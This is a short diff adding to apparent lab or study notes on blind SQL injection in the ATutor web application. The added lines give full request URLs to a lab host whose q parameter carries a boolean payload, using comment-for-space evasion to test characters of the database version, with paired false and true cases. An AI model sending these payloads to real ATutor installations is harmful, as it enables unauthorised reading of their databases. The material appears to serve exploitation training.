@@ -54,3 +54,11 @@ NOTE: it is good practice to convert to ASCII to avoid issues with the payload (
 > select/**/ascii(substring((select/**/version()),1,1))=52;
 
 > select/**/ascii(substring((select/**/version()),1,1))=53;
+
+Within a browser or direct to the Atutor application:
+
+False
+>http://192.168.216.103/ATutor/mods/_standard/social/index_public.php?q=test%27)/**/or/**/(select/**/ascii(substring((select/**/version()),1,1)))=52%23
+
+True
+> http://192.168.216.103/ATutor/mods/_standard/social/index_public.php?q=test%27)/**/or/**/(select/**/ascii(substring((select/**/version()),1,1)))=53%23
